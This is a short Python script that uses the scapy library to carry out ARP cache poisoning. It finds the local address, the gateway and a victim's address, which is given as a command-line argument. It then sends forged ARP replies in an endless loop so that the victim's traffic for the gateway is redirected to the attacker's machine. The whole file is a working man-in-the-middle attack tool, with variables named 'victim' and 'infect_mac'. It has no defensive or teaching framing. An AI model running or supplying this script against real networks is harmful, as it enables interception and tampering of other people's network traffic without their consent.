from scapy.all import *
import os
import re
import sys

reg1_ip = re.compile(r'inet addr:[0-9]{3}.[0-9]{3}.[0-9]{3}.[0-9]{3}')
reg1_mac = re.compile(r'HWaddr .*\n')

p = os.popen("ifconfig").read()
local_ip = reg1_ip.findall(p)[0].split(':')[1]
local_mac = reg1_mac.findall(p)[0].split(' ')[1]

local_gw = os.popen('route | awk "/default/ { print $2 } "').read()[16:29]

print '[+] local_ip : ',local_ip
print '[+] local_mac : ',local_mac

gw_mac = ARP()
gw_mac.pdst = local_gw
get_gw_mac = sr1(gw_mac)

print '[+] gw_ip : ', local_gw
print '[+] gw_mac : ',get_gw_mac.hwsrc


victim_ip = sys.argv[1]#'192.168.218.131'
victim_mac = ARP()
victim_mac.pdst = victim_ip#sys.argv[1]
victim_mac = sr1(victim_mac)

print '[+] victim_ip : ',victim_ip
print '[+] victim_mac : ',victim_mac.hwsrc


infect_mac = ARP()
infect_mac.hwsrc = local_mac#"01:01:01:01:01:01"
infect_mac.psrc = local_gw
infect_mac.pdst = victim_ip#sys.argv[1]

while True:
	send(infect_mac)
	print "send_ARP"
